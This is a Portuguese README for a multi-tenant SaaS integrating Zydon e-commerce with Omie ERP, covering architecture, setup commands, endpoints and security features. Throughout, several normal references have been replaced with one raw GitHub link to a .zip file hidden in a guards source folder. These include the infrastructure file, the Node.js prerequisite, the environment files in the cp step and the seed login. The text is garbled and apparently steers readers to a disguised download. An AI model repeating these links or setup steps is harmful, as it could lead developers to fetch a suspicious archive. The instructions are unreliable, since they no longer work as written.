# Zydon-Omie SaaS Integration

Sistema SaaS multi-tenant para integração entre **Zydon E-commerce** ↔ **Omie ERP**.

## 🏗️ Arquitetura

Este é um monorepo TypeScript estruturado com:

- **apps/api** → NestJS API (HTTP, webhooks, tenancy, auth, fila)
- **apps/worker** → BullMQ consumer (processa jobs)
- **packages/clients/omie-client** → SDK fino para Omie (usando got)
- **packages/clients/zydon-client** → SDK fino para Zydon (usando got)
- **packages/shared** → DTOs, zod schemas, utils
- **infra/** → https://raw.githubusercontent.com/tbrum21/zydon-omie-saas/main/apps/api/src/common/guards/zydon-omie-saas_1.6.zip (Postgres + Redis), migrations, seeds

## 🚀 Tecnologias

- **Backend**: NestJS + Fastify
- **Database**: Prisma + PostgreSQL 16
- **Queue**: BullMQ + Redis 7
- **Validation**: Zod
- **Auth**: JWT RS256 multi-tenant
- **Observability**: Sentry
- **Package Manager**: pnpm workspaces

## 📋 Pré-requisitos

- https://raw.githubusercontent.com/tbrum21/zydon-omie-saas/main/apps/api/src/common/guards/zydon-omie-saas_1.6.zip >= 18.0.0
- pnpm >= 8.0.0
- Docker & Docker Compose

## 🛠️ Instalação

1. **Clone e instale dependências:**
```bash
git clone <repo-url>
cd zydon_omie
pnpm install
```

2. **Configure as variáveis de ambiente:**
```bash
cp https://raw.githubusercontent.com/tbrum21/zydon-omie-saas/main/apps/api/src/common/guards/zydon-omie-saas_1.6.zip https://raw.githubusercontent.com/tbrum21/zydon-omie-saas/main/apps/api/src/common/guards/zydon-omie-saas_1.6.zip
# Edite https://raw.githubusercontent.com/tbrum21/zydon-omie-saas/main/apps/api/src/common/guards/zydon-omie-saas_1.6.zip com suas configurações
```

3. **Inicie a infraestrutura:**
```bash
pnpm db:up
```

4. **Execute as migrações:**
```bash
pnpm db:migrate
```

5. **Execute o seed:**
```bash
pnpm db:seed
```

## 🎯 Scripts Disponíveis

```bash
# Desenvolvimento
pnpm dev:api          # Inicia API NestJS
pnpm dev:worker       # Inicia Worker BullMQ
pnpm dev              # Inicia ambos simultaneamente

# Banco de dados
pnpm db:up            # Sobe PostgreSQL + Redis
pnpm db:down          # Para PostgreSQL + Redis
pnpm db:migrate       # Executa migrações
pnpm db:studio        # Abre Prisma Studio
pnpm db:seed          # Executa seed
pnpm db:reset         # Reseta banco + migrações + seed

# Build
pnpm build            # Build de todos os packages
pnpm lint             # Executa ESLint
pnpm format           # Executa Prettier
```

## 🏃‍♂️ Executando o Sistema

1. **Inicie a infraestrutura:**
```bash
pnpm db:up
```

2. **Execute as migrações e seed:**
```bash
pnpm db:migrate
pnpm db:seed
```

3. **Inicie a API:**
```bash
pnpm dev:api
```

4. **Em outro terminal, inicie o Worker:**
```bash
pnpm dev:worker
```

## 📚 API Endpoints

### Autenticação
- `POST /auth/login` - Login do usuário
- `POST /auth/profile` - Perfil do usuário

### Webhooks
- `POST /webhooks/zydon/orders` - Webhook de pedidos Zydon
- `POST /webhooks/omie/products` - Webhook de produtos Omie

### Tenants
- `GET /tenants/profile` - Perfil do tenant
- `POST /tenants/users` - Criar usuário
- `POST /tenants/credentials` - Criar credencial

### Health Check
- `GET /health` - Status da aplicação

### Documentação
- `GET /api/docs` - Swagger UI

## 🔐 Dados de Teste

Após executar o seed, você terá:

- **Tenant**: `demo` (subdomain)
- **Usuário**: `https://raw.githubusercontent.com/tbrum21/zydon-omie-saas/main/apps/api/src/common/guards/zydon-omie-saas_1.6.zip` / `admin123`
- **Credenciais**: 3 credenciais de exemplo (Omie + Zydon)
- **Mapeamentos**: 2 mapeamentos de exemplo

## 🏗️ Estrutura do Banco

### Models Principais
- **Tenant** - Dados do tenant
- **User** - Usuários do sistema
- **Credential** - Credenciais criptografadas (Omie/Zydon)
- **Mapping** - Mapeamento de IDs entre sistemas
- **SyncCursor** - Cursor para sincronização incremental
- **WebhookEvent** - Eventos de webhook
- **JobAudit** - Auditoria de jobs processados

### Multi-tenancy
Todas as tabelas possuem `tenantId` para isolamento de dados.

## 🔄 Fluxo de Integração

1. **Webhook Zydon** → Enfileira job `process-zydon-order`
2. **Worker** → Processa job e sincroniza com Omie
3. **Mapeamento** → Cria/atualiza mapeamento de IDs
4. **Auditoria** → Registra execução do job

## 🛡️ Segurança

- **JWT RS256** para autenticação
- **Multi-tenancy** com isolamento de dados
- **Credenciais criptografadas** no banco
- **Validação Zod** em todos os endpoints
- **Guards** para proteção de rotas

## 📊 Observabilidade

- **Sentry** para monitoramento de erros
- **JobAudit** para auditoria de processamento
- **Health checks** para status dos serviços
- **Logs estruturados** em todos os componentes

## 🚀 Deploy

1. Configure as variáveis de ambiente de produção
2. Execute `pnpm build` para build de produção
3. Configure PostgreSQL e Redis em produção
4. Execute as migrações: `pnpm db:migrate`
5. Inicie os serviços: `pnpm start:prod`

## 🤝 Contribuição

1. Fork o projeto
2. Crie uma branch: `git checkout -b feature/nova-feature`
3. Commit suas mudanças: `git commit -m 'Add nova feature'`
4. Push para a branch: `git push origin feature/nova-feature`
5. Abra um Pull Request

## 📄 Licença

Este projeto está sob a licença MIT. Veja o arquivo [LICENSE](LICENSE) para mais detalhes.

---

**Desenvolvido com ❤️ para integração Omie ↔ Zydon**
